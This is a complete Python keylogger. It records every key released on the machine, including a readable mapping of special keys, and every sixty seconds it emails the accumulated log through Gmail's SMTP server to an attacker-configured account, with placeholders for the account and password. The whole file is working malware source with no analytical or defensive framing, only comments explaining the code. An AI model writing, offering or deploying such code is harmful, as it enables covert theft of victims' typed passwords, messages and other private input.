import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
from threading import Timer


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name


    def sendm(self, email, password, message):
        server = smtplib.SMTP_SSL(host="smtp.gmail.com", port=465)
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.sendm("<Gmail Id>", "<Password>", self.log)
            self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
    keyl = Keylogger(interval=60)
    keyl.start()
